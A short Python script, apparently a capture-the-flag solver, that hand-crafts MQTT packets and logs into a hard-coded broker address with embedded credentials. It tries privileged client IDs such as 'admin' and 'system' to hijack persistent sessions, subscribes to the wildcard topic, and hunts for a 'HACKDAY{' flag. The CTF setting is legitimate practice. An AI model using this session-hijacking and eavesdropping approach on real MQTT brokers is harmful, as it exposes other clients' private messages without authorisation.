import socket
import struct
import time
import random
import string

def mqtt_connect(client_id, username=None, password=None, clean_session=True):
    flags = 0x00
    if clean_session: flags |= 0x02
    if username: flags |= 0x80
    if password: flags |= 0x40
    var_header = b'\x00\x04MQTT\x04' + bytes([flags]) + b'\x00\x3c'
    payload = struct.pack("!H", len(client_id)) + client_id.encode()
    if username: payload += struct.pack("!H", len(username)) + username.encode()
    if password: payload += struct.pack("!H", len(password)) + password.encode()
    rem_len = len(var_header) + len(payload)
    return b'\x10' + bytes([rem_len]) + var_header + payload

def mqtt_subscribe(topic, packet_id):
    var_header = struct.pack("!H", packet_id)
    payload = struct.pack("!H", len(topic)) + topic.encode() + b'\x00'
    rem_len = len(var_header) + len(payload)
    return b'\x82' + bytes([rem_len]) + var_header + payload

def solve():
    server = "51.210.244.18"
    port = 1883
    user = "hackday"
    pwd = "1Bc2Mk0rlevzuCG6AaDK6Opa"
    
    client_ids = ["admin", "administrator", "system", "archive", "1999", "y2k"]
    
    for cid in client_ids:
        print(f"[*] Trying client_id: {cid}")
        try:
            s = socket.create_connection((server, port), timeout=5)
            s.sendall(mqtt_connect(cid, user, pwd, clean_session=False))
            connack = s.recv(4)
            print(f"  Connack: {connack.hex()}")
            
            s.sendall(mqtt_subscribe("#", 30000))
            
            # Look for flag in first 2 seconds
            start = time.time()
            while time.time() - start < 2:
                data = s.recv(4096)
                if not data: break
                decoded = data.decode(errors='ignore')
                if "HACKDAY{" in decoded:
                    print(f"  [!!!] FLAG FOUND with {cid}: {decoded}")
            s.close()
        except Exception as e:
            print(f"  Error: {e}")

if __name__ == "__main__":
    solve()
